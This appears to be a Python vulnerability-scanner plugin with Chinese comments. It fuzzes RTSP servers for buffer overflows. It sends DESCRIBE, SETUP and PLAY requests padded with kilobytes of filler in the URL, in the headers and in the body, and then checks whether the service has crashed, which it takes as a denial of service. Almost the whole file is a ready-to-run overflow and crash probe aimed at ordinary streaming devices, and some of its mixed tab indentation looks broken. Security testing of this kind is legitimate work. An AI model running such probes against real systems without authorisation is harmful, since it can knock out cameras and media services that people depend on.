# -*- coding: utf-8 -*- 
import platform
import socket
import sys
import time

DEFAULT_FUZEER_DICT = {
    "DESCRIBE": ["URL", "Authorization"],
    "SETUP": ["URL", "Authorization", "Transport", "Accept"],
    "PLAY": ["URL", "Authorization", "Range", "Content"]
}

# RTSP支持方法
RTSP_METHODS = ["DESCRIBE", "ANNOUNCE", "GET_PARAMETER", "OPTIONS", "PAUSE", "PLAY", "RECORD", "REDIRECT", "SETUP",
                "SET_PARAMETER", "TEARDOWN"]
# RTSP通用头部
GENERAL_HEADERS = ["Cache-Control", "Connection", "Date", "Via"]
# RTSP支持的请求头部
REQUEST_HEADERS = ["Accept", "Accept-Encoding", "Accept-Language", "Authorization", "From", "If-Modified-Since",
                   "Range", "Referer", "User-Agent"]
# RTSP支持的响应头部
RESPONSE_HEADERS = ["Location", "Proxy-Authenticate", "Public", "Retry-After", "Server", "Vary", "WWW-Authenticate"]
# RTSP支持的实体头部
ENTITY_DEADERS = ["Allow", "Content-Base", "Content-Encoding", "Content-Language", "Content-Length",
                  "Content-Location", "Content-Type", "Expires", "Last-Modified"]
# RTSP协议支持的头部=通用头+请求头+实体头
RTSP_HEADERS = GENERAL_HEADERS + REQUEST_HEADERS + ENTITY_DEADERS + ["URL", "Content"]
# 预定义的RTSP describe方法头字段信息（CSeq/Accept/Authorization/User-Agent）
RTSP_DESCRIBE_HEADERS_MAP = {
    "CSeq": "3",
    "Accept": "application/sdp",
    "Authorization": "Digest " + 'A' * 100,
    "User-Agent": "VLC media player"
}
# 预定义的RTSP setup方法头字段信息（CSeq/Authorization/Transpot/Session/User-Agent）
RTSP_SETUP_HEADERS_MAP = {
    "CSeq": "5",
    "Authorization": "Digest " + 'a' * 100,
    "Transport": "RTP/AVP/TCP;unicast;client_port=51904-51905",
    "Session": "546212345",
    "User-Agent": "VLC media player"
}
# 预定义的RTSP announce方法头字段信息（CSeq/Authorization）
RTSP_ANNOUNCE_HEADERS_MAP = {
    "CSeq": "7",
    "Authorization": "Digest " + 'A' * 100
}
# 预定义的RTSP play方法头字段信息（CSeq/Authorization/Range/Session）
RTSP_PLAY_HEADERS_MAP = {
    "CSeq": "9",
    "Authorization": "Digest " + 'B' * 100,
    "Range": "npt=0.000-",
    "Session": "546212840"
}
# 预定义的RTSP TEARDOWN方法头字段信息（CSeq/Authorization/Session）
RTSP_TEARDOWN_HEADERS_MAP = {
    "CSeq": "11",
    "Authorization": "Digest " + 'B' * 100,
    "Session": "546212840"
}
# 预定义的RTSP GET_PARAMETER方法头字段信息（CSeq/Authorization/Session）
RTSP_GET_PARAMETER_HEADERS_MAP = {
    "CSeq": "13",
    "Authorization": "Digest " + 'B' * 100,
    "Session": "546212840",
}
# 预定义的RTSP SET_PARAMETER方法头字段信息（CSeq/Authorization/Session）
RTSP_SET_PARAMETER_HEADERS_MAP = {
    "CSeq": "15",
    "Authorization": "Digest " + 'B' * 100,
    "Session": "546212840"
}
# RTSP 请求方法和预定义请求头的映射（PLAY、SETUP、DESCRIBE）
RTSP_METHOD_MAP = {"DESCRIBE": RTSP_DESCRIBE_HEADERS_MAP, "SETUP": RTSP_SETUP_HEADERS_MAP,
                   "PLAY": RTSP_PLAY_HEADERS_MAP}

# 缓冲区溢出标志：查询系统类型后，在查找表中查询到对应的value，所以Dos-error-List是错误代码的列表
_SYSTEM_DOS_FLAG_LIST = {"Windows": ['10061', '10054','10055'], "Linux": ['111', '104']}
#10061不能做任何连接，10054远程主机强迫关闭了一个现有链接，111连接被拒绝，104连接被对端重置（即产生DOS才会出现的错误代码）
DOS_ERRNO_LIST = _SYSTEM_DOS_FLAG_LIST[platform.system()]
TIME_WAIT_DOS = 2


def has_dos_flag(except_str):
    """
    检测是否是拒绝服务
    :param except_str:
            异常原因
    :return:
            True 拒绝服务
            Flase 不是拒绝服务
    """
    for dos_errno in DOS_ERRNO_LIST:
        if dos_errno in except_str:
            return True
    return False
#检测是否出现DOS：对比异常原因的返回值是否在错误代码列表中

def equal_ignore_case(str1, str2):
    """
    比较两个字符串是否相等（忽略大小写）
    :param str1:
    :param str2:
    :return:
        True 字符串相等
        False 字符串不相等
    """
    try:
        return str1.upper() == str2.upper()
    except AttributeError:
        return str1 == str2


def check_dos(host, port, payload):
    """
    检测发送特定数据包后是否出现拒绝服务
    :param host
    :param port
    :param payload:
            构造好的缓冲区溢出数据包
    :return:
            True 拒绝服务
            Flase 不是拒绝服务
    """
    # 发送缓冲区溢出数据包（引入Socket模块，AF_INET：服务期间的通信，SOCK_STREAM：流式socket，for TCP）
    soc = None
    except_str = ""
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#创建TCP Socket
        soc.settimeout(1)
        soc.connect((host, port))
        soc.sendall(payload)
        soc.recv(100)
	#settimeout:设置套接字操作的超时期（浮点数，单位s）
	#connect:参数address的格式为二元组（host,port），连接套接字失败返回socket.error
	#sendall:将payload的所有数据发送到连接的套接字，成功返回None
	#recv:能接受的最大数据量为100
    except Exception:
        pass
    finally:
        if soc:
            soc.close()
    # 等待系统宕机
    time.sleep(TIME_WAIT_DOS)
    # 推迟两秒执行，验证是否产生缓冲区溢出
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect((host, port))
    except Exception as e:
        except_str = str(e)
    finally:
        if soc:
            soc.close()
    # 根据异常信息判断是否产生缓冲区溢出
    status = has_dos_flag(except_str)
    return status


def check_port_on(host, port):
    """
    检测端口是否开放
    :param host:
            主机ip地址
    :param port:
            端口号
    :return:
            端口开放 True
            其它未知情况 False
    """
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	#设置套接字选项的值（level,optname,value）
    status = soc.connect_ex((host, port))
	#连接套接字，成功返回0，失败返回errno
    soc.close()
    if status == 0:
        return True
    else:
        return False


class RTSPOverflowFuzzer(object):
    """
    RTSP 缓冲区溢出漏洞探测器
    """
    PROTOCOL = "RTSP"
    VUL_ID = "IIE-bufferOF-RTSP"

    def __init__(self, host, port=554, uri='/', *args, **kwargs):
        self._host = host
        self._port = port
        if self._port == 554:
            self._url = self._host + uri
        else:
            self._url = self._host + ':' + str(self._port) + uri
        self.logger = kwargs["logger"] if "logger" in kwargs else None
        self._fuzz_map = RTSPOverflowFuzzer.__read_configfile()

    def verify(self):
        """
        进行fuzzer探测,如果有漏洞返回true,否则返回false
        """

        ret = {"status": False, "data": None}
        server_support_methods = self.get_support_methods()
        # 得到服务器支持的RTSP方法
        if check_port_on(self._host, self._port):
            # 连接成功：遍历需要fuzz的rtsp method,进行fuzz测试
            for method in self._fuzz_map:
                if method in server_support_methods:
                    # 如果默认的方法（DESCRIBE,SETUP,PLAY）在服务器支持的方法中
                    for header in self._fuzz_map[method]:
                        
                        if header not in RTSP_HEADERS:
                            continue
                        # 只处理rtsp支持的头部
						# 构造缓冲区溢出数据包
                        packet_list = self.generate_fuzz_packet(method, header)
                        # 针对每一个packet进行验证
                        for packet in packet_list:
                            # 验证上述产生的包是否产生缓冲区溢出
                            if check_dos(self._host, self._port, packet):
                                ret["status"] = True
                                ret["data"] = "溢出位置:" + method + "," + header
                                return ret
       
		return ret
		#成功：返回TRUE和溢出位置（method，header）
    def rtsp_option(self):
        """
        正常的options数据包
        :return:
            options数据包
        """
        packet = "OPTIONS rtsp://" + self._url + " RTSP/1.0\r\n"
        packet += "CSeq: 2\r\n"
        packet += "User-Agent: LibVLC/2.2.1 (LIVE555 StreamingMedia )"
        packet += "\r\n\r\n"
        return packet

    def generate_fuzz_packet(self, method, header_name):
        """
        构造缓冲区溢出数据包
        :param method:
                请求方法
        :param header_name:
                请求头名字
        :return:
            list 返回缓冲区溢出包列表
        """
        header_map = RTSP_METHOD_MAP[method].copy()
        request_body = ""
        packet_list = []
        # 构造溢出请求行
        if equal_ignore_case(header_name, "URL"):
            request_line = method + " rtsp://" + self._host + "dos:dos" + str(
                self._port) + "5454*18" + "//" + "a" * 1024 + " RTSP/1.0\r\n"
        else:
            request_line = method + " rtsp://" + self._url + " RTSP/1.0\r\n"
        # 如果包含了请求体
        if equal_ignore_case(header_name, "Content"):
            header_map["Content-Type"] = "text/parameters"
            header_map["Content-Length"] = str(10009)
            header_map["Content"] = 'A' * 12009
        packet1 = request_line
        packet2 = request_line
        # 构造请求头
        for header in header_map:
            # 跳过content
            if equal_ignore_case(header, 'Content'):
                request_body = header_map["Content"]
                continue
            if equal_ignore_case(header, header_name):
                packet1 += (header + " " + "assd" * 1024 + ": " + header_map[header] + "\r\n")
                packet2 += (header + ": " + header_map[header] + "assdc" * 1024 + "\r\n")
            else:
                packet1 += (header + ": " + header_map[header] + "\r\n")
                packet2 += (header + ": " + header_map[header] + "\r\n")
        # 构造请求体
        packet1 += "\r\n" + request_body
        packet2 += "\r\n" + request_body
        if header_name.lower() in ["url", "content"]:
            packet_list.append(packet1)
        else:
            packet_list.append(packet1)
            packet_list.append(packet2)
        return packet_list

    @staticmethod
    def header_check(header_name):
        """
        请求头中键的合法性检查
        :param header_name:
        :return:
                True 合法
                False 非法字段
        """
        if header_name:
            return True
        else:
            return False

    @staticmethod
    def __read_configfile():
        fuzz_map = DEFAULT_FUZEER_DICT
        return fuzz_map

    def get_support_methods(self):
        """
        获取服务器支持的RTSP方法列表
        :return:
                服务器支持的RTSP method list
        """
        soc = None
        server_support_methods = []
        # 首先获取服务器支持的rtsp方法
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((self._host, self._port))
            soc.sendall(self.rtsp_option())
            recv = soc.recv(1024)
            for method in RTSP_METHODS:
                if method in recv:
                    server_support_methods.append(method)
        except Exception as e:
            sys.stderr.write("get_support_methods():" + self._host + "\t" + str(e) + "\n")
        finally:
            if soc:
                soc.close()
        return server_support_methods


if __name__ == '__main__':
    host = "192.x.x.x"
    port = 554
    ret = RTSPOverflowFuzzer(host, port).verify()
    print(ret)
